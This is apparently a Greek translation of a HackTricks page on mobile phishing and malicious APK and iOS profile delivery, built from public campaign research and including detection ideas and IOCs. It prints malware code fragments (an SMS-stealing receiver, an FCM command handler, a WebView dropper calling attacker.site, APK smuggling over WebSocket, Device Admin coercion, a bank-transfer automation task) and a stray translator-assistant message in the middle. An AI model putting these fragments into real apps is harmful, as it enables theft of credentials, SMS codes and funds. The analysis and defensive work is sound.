# Mobile Phishing & Διανομή Κακόβουλων Εφαρμογών (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν οι threat actors για να διανείμουν **malicious Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps, κ.λπ.).
> Το υλικό είναι προσαρμοσμένο από την καμπάνια SarangTrap που αποκάλυψε το Zimperium zLabs (2025) και άλλες δημόσιες έρευνες.

## Ροή Επίθεσης

1. **SEO/Phishing Infrastructure**
* Εγγραφή δεκάδων look-alike domains (dating, cloud share, car service…).
– Χρήση λέξεων-κλειδιών στη τοπική γλώσσα και emojis στο `<title>` για καλύτερο ranking στο Google.
– Φιλοξενήστε *και* οδηγίες εγκατάστασης για Android (`.apk`) και iOS στην ίδια landing page.
2. **First Stage Download**
* Android: άμεσος σύνδεσμος σε *unsigned* ή “third-party store” APK.
* iOS: `itms-services://` ή απλός HTTPS σύνδεσμος σε κακόβουλο **mobileconfig** profile (βλέπε παρακάτω).
3. **Post-install Social Engineering**
* Κατά το πρώτο άνοιγμα, η εφαρμογή ζητάει έναν **invitation / verification code** (η ψευδαίσθηση αποκλειστικής πρόσβασης).
* Ο κωδικός **POSTed over HTTP** προς το Command-and-Control (C2).
* Το C2 απαντά `{"success":true}` ➜ το malware συνεχίζει.
* Sandbox / AV dynamic analysis που δεν υποβάλει ποτέ έγκυρο κωδικό δεν βλέπει **κακόβουλη συμπεριφορά** (evasion).
4. **Runtime Permission Abuse** (Android)
* Επικίνδυνα permissions ζητούνται μόνο **μετά από θετική απάντηση C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Πρόσφατες παραλλαγές **αφαιρούν `<uses-permission>` για SMS από το `AndroidManifest.xml`** αλλά διατηρούν το Java/Kotlin code path που διαβάζει SMS μέσω reflection ⇒ μειώνει το static score ενώ παραμένει λειτουργικό σε συσκευές που χορηγούν την άδεια μέσω κατάχρησης `AppOps` ή σε παλαιότερους στόχους.
5. **Facade UI & Background Collection**
* Η εφαρμογή εμφανίζει αθώα views (SMS viewer, gallery picker) υλοποιημένα τοπικά.
* Παράλληλα εξάγει:
- IMEI / IMSI, αριθμό τηλεφώνου
- Πλήρες dump του `ContactsContract` (JSON array)
- JPEG/PNG από `/sdcard/DCIM` συμπιεσμένα με [Luban](https://github.com/Curzibn/Luban) για μείωση μεγέθους
- Προαιρετικό περιεχόμενο SMS (`content://sms`)
Τα payloads **πακετάρονται σε παρτίδες (batch-zipped)** και στέλνονται μέσω `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Ένα μοναδικό **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. για να εγγράψει τη συσκευή σε “MDM”-like supervision.
* Οδηγίες social-engineering:
1. Ανοίξτε Settings ➜ *Profile downloaded*.
2. Πατήστε *Install* τρεις φορές (screenshots στη phishing page).
3. Trust the unsigned profile ➜ ο attacker αποκτά entitlement για *Contacts* & *Photo* χωρίς έλεγχο στο App Store.
7. **Network Layer**
* Plain HTTP, συχνά στην πόρτα 80 με HOST header σαν `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εύκολο να εντοπιστεί).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Κατά την αξιολόγηση malware, αυτοματοποιήστε τη φάση του invitation code με Frida/Objection για να φτάσετε στον κακόβουλο κλάδο.
* **Manifest vs. Runtime Diff** – Συγκρίνετε `aapt dump permissions` με το runtime `PackageManager#getRequestedPermissions()`; τα απουσιάζοντα επικίνδυνα perms είναι κόκκινη σημαία.
* **Network Canary** – Διαμορφώστε `iptables -p tcp --dport 80 -j NFQUEUE` για να ανιχνεύσετε ασυνήθιστα bursts από POST μετά την εισαγωγή του κωδικού.
* **mobileconfig Inspection** – Χρησιμοποιήστε `security cms -D -i profile.mobileconfig` σε macOS για να εμφανίσετε το `PayloadContent` και να εντοπίσετε υπερβολικά entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** για να εντοπίζετε απότομες εμφανίσεις keyword-rich domains.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` από Dalvik clients εκτός Google Play.
* **Invite-code Telemetry** – POSTs με 6–8 ψηφιακούς κωδικούς λίγο μετά την εγκατάσταση του APK μπορεί να υποδεικνύουν staging.
* **MobileConfig Signing** – Μπλοκάρετε unsigned configuration profiles μέσω πολιτικής MDM.

## Χρήσιμο Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Δείκτες (Γενικά)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Αυτό το pattern έχει παρατηρηθεί σε καμπάνιες που εκμεταλλεύονται θέματα κυβερνητικών επιδομάτων για να κλέψουν UPI credentials και OTPs από χρήστες στην Ινδία. Οι operators συνδέουν αξιόπιστες πλατφόρμες για παράδοση και ανθεκτικότητα.

### Delivery chain across trusted platforms
- YouTube video lure → η περιγραφή περιέχει ένα short link
- Shortlink → GitHub Pages phishing site που μιμείται το legit portal
- Το ίδιο GitHub repo φιλοξενεί ένα APK με ένα ψευδές “Google Play” badge που συνδέει απευθείας στο αρχείο
- Δυναμικές phishing σελίδες ζουν σε Replit· το κανάλι απομακρυσμένων εντολών χρησιμοποιεί Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Το πρώτο APK είναι ένας installer (dropper) που μεταφέρει το πραγματικό malware στο `assets/app.apk` και προτρέπει τον χρήστη να απενεργοποιήσει το Wi‑Fi/mobile data για να μειώσει την ανίχνευση από το cloud.
- Το embedded payload εγκαθίσταται με έναν αθώο τίτλο (π.χ., “Secure Update”). Μετά την εγκατάσταση, τόσο ο installer όσο και το payload υπάρχουν ως ξεχωριστές εφαρμογές.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Δυναμική ανακάλυψη endpoints μέσω shortlink
- Malware ανακτά μια λίστα σε plain-text, διαχωρισμένη με κόμμα, με live endpoints από ένα shortlink· απλοί μετασχηματισμοί string παράγουν την τελική διαδρομή της phishing σελίδας.

Παράδειγμα (καθαρισμένο):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Ψευδοκώδικας:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based συλλογή διαπιστευτηρίων UPI
- Το βήμα “Make payment of ₹1 / UPI‑Lite” φορτώνει μια attacker HTML form από το dynamic endpoint μέσα σε ένα WebView και καταγράφει ευαίσθητα πεδία (phone, bank, UPI PIN) τα οποία γίνονται `POST` σε `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Ζητούνται επιθετικές άδειες στην πρώτη εκτέλεση:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Οι επαφές επαναχρησιμοποιούνται σε βρόχο για μαζική αποστολή smishing SMS από τη συσκευή του θύματος.
- Τα εισερχόμενα SMS αναχαιτίζονται από έναν broadcast receiver και αποστέλλονται μαζί με μεταδεδομένα (sender, body, SIM slot, per-device random ID) στο `/addsm.php`.

Σκαρίφημα του receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) ως ανθεκτικό C2
- Το payload εγγράφεται στο FCM· τα push μηνύματα φέρουν ένα πεδίο `_type` που χρησιμοποιείται ως διακόπτης για την ενεργοποίηση ενεργειών (π.χ., ενημέρωση phishing text templates, εναλλαγή συμπεριφορών).

Παράδειγμα FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler σχέδιο:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Πρότυπα ανίχνευσης και IOCs
- APK περιέχει δευτερεύον payload στο `assets/app.apk`
- WebView φορτώνει payment από `gate.htm` και εξάγει δεδομένα σε `/addup.php`
- Εξαγωγή SMS σε `/addsm.php`
- Shortlink-driven ανάκτηση config (π.χ., `rebrand.ly/*`) που επιστρέφει CSV endpoints
- Εφαρμογές επισημασμένες ως γενικές “Update/Secure Update”
- FCM `data` μηνύματα με διαχωριστή `_type` σε μη αξιόπιστες εφαρμογές

### Ιδέες ανίχνευσης και άμυνας
- Σημάνετε εφαρμογές που ζητούν από χρήστες να απενεργοποιήσουν το δίκτυο κατά την εγκατάσταση και στη συνέχεια κάνουν side-load δεύτερο APK από `assets/`.
- Ειδοποίηση για το tuple δικαιωμάτων: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Παρακολούθηση egress για `POST /addup.php|/addsm.php` σε μη εταιρικούς hosts; μπλοκάρετε γνωστή υποδομή.
- Κανόνες Mobile EDR: μη αξιόπιστη εφαρμογή που εγγράφεται για FCM και διακλαδίζεται με βάση το πεδίο `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Τυπική ροή client που παρατηρείται στην πράξη:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Γιατί το παρακάμπτει απλούς ελέγχους:
- Δεν αποκαλύπτεται στατικό APK URL· το payload ανασυντίθεται στη μνήμη από WebSocket frames.
- URL/MIME/extension φίλτρα που μπλοκάρουν άμεσες .apk αποκρίσεις μπορεί να χάσουν δυαδικά δεδομένα που τούνελάρουν μέσω WebSockets/Socket.IO.
- Crawlers και URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Ιδέες ανίχνευσης και εντοπισμού:
- Web/network telemetry: σημαδέψτε συνεδρίες WebSocket που μεταφέρουν μεγάλα δυαδικά chunks και ακολουθεί η δημιουργία ενός Blob με MIME application/vnd.android.package-archive και ένα προγραμματικό `<a download>` click. Ψάξτε για client strings όπως socket.emit('startDownload') και για events με ονόματα chunk, downloadProgress, downloadComplete σε scripts σελίδας.
- Play-store spoof heuristics: σε μη-Google domains που σερβίρουν Play-like σελίδες, αναζητήστε Google Play UI strings όπως http.html:"VfPpkd-jY41G-V67aGc", μικτά πρότυπα γλωσσών, και ψεύτικες ροές “verification/progress” που κινούνται από WS events.
- Controls: μπλοκάρετε την παράδοση APK από μη-Google origins· επιβάλετε πολιτικές MIME/extension που περιλαμβάνουν την κίνηση WebSocket· διατηρήστε τα browser safe-download prompts.

Δείτε επίσης WebSocket tradecraft και tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – μελέτη περίπτωσης RatOn

Η εκστρατεία RatOn banker/RAT (ThreatFabric) είναι ένα συγκεκριμένο παράδειγμα του πώς οι σύγχρονες mobile phishing επιχειρήσεις συνδυάζουν WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover και ακόμη NFC-relay orchestration. Αυτή η ενότητα περιγράφει αφαιρετικά τις τεχνικές που μπορούν να επαναχρησιμοποιηθούν.

### Στάδιο 1: WebView → native install bridge (dropper)
Οι επιτιθέμενοι παρουσιάζουν ένα WebView που δείχνει σε μια σελίδα του επιτιθέμενου και εγχέουν ένα JavaScript interface που εκθέτει έναν native installer. Ένα πάτημα σε ένα HTML button καλεί native code που εγκαθιστά ένα second-stage APK συσκευασμένο στα assets του dropper και στη συνέχεια το εκκινεί κατευθείαν.

Ελάχιστο μοτίβο:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
I don't see the HTML/markdown content to translate. Please paste the HTML or markdown from src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md (or the page content) and I'll translate the English text to Greek, preserving all code, tags, links, paths and markdown/html syntax per your instructions.
```html
<button onclick="bridge.installApk()">Install</button>
```
Μετά την εγκατάσταση, ο dropper ξεκινάει το payload μέσω explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ιδέα ανίχνευσης: μη αξιόπιστες εφαρμογές που καλούν `addJavascriptInterface()` και εκθέτουν μεθόδους τύπου installer στο WebView· APK που παραδίδει ενσωματωμένο δευτερεύον payload κάτω από το `assets/` και καλεί την Package Installer Session API.

### Διαδικασία συναίνεσης: Accessibility + Device Admin + επακόλουθες runtime προτροπές
Stage-2 ανοίγει ένα WebView που φιλοξενεί μια σελίδα «Access». Το κουμπί της καλεί μια εξαγόμενη μέθοδο που πλοηγεί το θύμα στις ρυθμίσεις Accessibility και ζητά την ενεργοποίηση της rogue υπηρεσίας. Μόλις δοθεί, το malware χρησιμοποιεί Accessibility για να κάνει αυτόματα κλικ μέσα από τις επακόλουθες διαλόγους runtime permissions (contacts, overlay, manage system settings, κ.λπ.) και να ζητήσει Device Admin.

- Η Accessibility προγραμματιστικά βοηθά στην αποδοχή των επόμενων προτροπών εντοπίζοντας κουμπιά όπως “Allow”/“OK” στο node-tree και εκτελώντας κλικ.
- Έλεγχος/αίτηση overlay permission:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Δείτε επίσης:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Οι χειριστές μπορούν να εκδώσουν εντολές για:
- να προβάλλουν ένα full-screen overlay από ένα URL, ή
- να περάσουν inline HTML που φορτώνεται σε WebView overlay.

Πιθανές χρήσεις: coercion (PIN entry), άνοιγμα wallet για καταγραφή PINs, ransom messaging. Διατήρησε μια εντολή για να εξασφαλίζει ότι το overlay permission έχει δοθεί αν λείπει.

### Μοντέλο απομακρυσμένου ελέγχου – text pseudo-screen + screen-cast
- Χαμηλό bandwidth: περιοδικά εξάγουν το Accessibility node tree, σειριοποιούν τα ορατά texts/roles/bounds και τα στέλνουν στο C2 ως pseudo-screen (εντολές όπως `txt_screen` μία φορά και `screen_live` συνεχώς).
- Υψηλή πιστότητα: ζητήστε MediaProjection και ξεκινήστε screen-casting/recording κατ' απαίτηση (εντολές όπως `display` / `record`).

### ATS playbook (αυτοματισμός bank app)
Δεδομένου ενός JSON task, ανοίξτε την bank app, οδηγήστε το UI μέσω Accessibility με συνδυασμό text queries και taps σε συντεταγμένες, και εισάγετε το payment PIN του θύματος όταν ζητηθεί.

Παράδειγμα task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Νέα πληρωμή"
- "Zadat platbu" → "Εισαγωγή πληρωμής"
- "Nový příjemce" → "Νέος παραλήπτης"
- "Domácí číslo účtu" → "Εγχώριος αριθμός λογαριασμού"
- "Další" → "Επόμενο"
- "Odeslat" → "Αποστολή"
- "Ano, pokračovat" → "Ναι, συνεχίστε"
- "Zaplatit" → "Πλήρωσε"
- "Hotovo" → "Ολοκληρώθηκε"

Οι χειριστές μπορούν επίσης να ελέγξουν/αυξήσουν τα όρια μεταφοράς μέσω εντολών όπως `check_limit` και `limit`, οι οποίες πλοηγούνται στην ίδια διεπαφή ορίων (limits UI).

### Crypto wallet seed extraction
Στόχοι όπως MetaMask, Trust Wallet, Blockchain.com, Phantom. Ροή: unlock (κλεμμένο PIN ή παρεχόμενος κωδικός), πλοήγηση στο Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Εφαρμόστε selectors ευαίσθητους στο locale (EN/RU/CZ/SK) για να σταθεροποιήσετε την πλοήγηση μεταξύ γλωσσών.

### Device Admin coercion
Device Admin APIs χρησιμοποιούνται για να αυξήσουν τις ευκαιρίες καταγραφής του PIN και να δυσχεράνουν/εκνευρίσουν το θύμα:

- Άμεσο κλείδωμα:
```java
dpm.lockNow();
```
- Λήξτε το τρέχον διαπιστευτήριο για να αναγκάσετε αλλαγή (Accessibility καταγράφει το νέο PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Εξαναγκάστε το ξεκλείδωμα χωρίς βιομετρικά απενεργοποιώντας τις keyguard biometric features:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Σημείωση: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC relay orchestration (NFSkate)
Το Stage-3 μπορεί να εγκαταστήσει και να εκτελέσει ένα εξωτερικό NFC-relay module (π.χ., NFSkate) και ακόμα να του παραδώσει ένα HTML template για να καθοδηγήσει το θύμα κατά τη διάρκεια του relay. Αυτό επιτρέπει contactless card-present cash-out παράλληλα με online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Ιδέες ανίχνευσης & άμυνας (RatOn-style)
- Αναζητήστε WebViews με `addJavascriptInterface()` που εκθέτουν installer/permission methods· σελίδες που τελειώνουν σε “/access” και ενεργοποιούν Accessibility prompts.
- Ειδοποιήστε για apps που παράγουν υψηλό ρυθμό Accessibility gestures/clicks λίγο μετά την παραχώρηση πρόσβασης σε service; τηλεμετρία που μοιάζει με Accessibility node dumps αποστέλλεται σε C2.
- Παρακολουθήστε αλλαγές πολιτικών Device Admin σε μη αξιόπιστες εφαρμογές: `lockNow`, password expiration, keyguard feature toggles.
- Ειδοποιήστε για MediaProjection prompts από μη-corporate apps ακολουθούμενα από περιοδικά uploads καρέ.
- Εντοπίστε εγκατάσταση/εκκίνηση εξωτερικής NFC-relay app που ενεργοποιείται από άλλη εφαρμογή.
- Για τραπεζικές εφαρμογές: επιβάλετε out-of-band confirmations, biometrics-binding, και transaction-limits ανθεκτικά στην on-device αυτοματοποίηση.

## Αναφορές

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
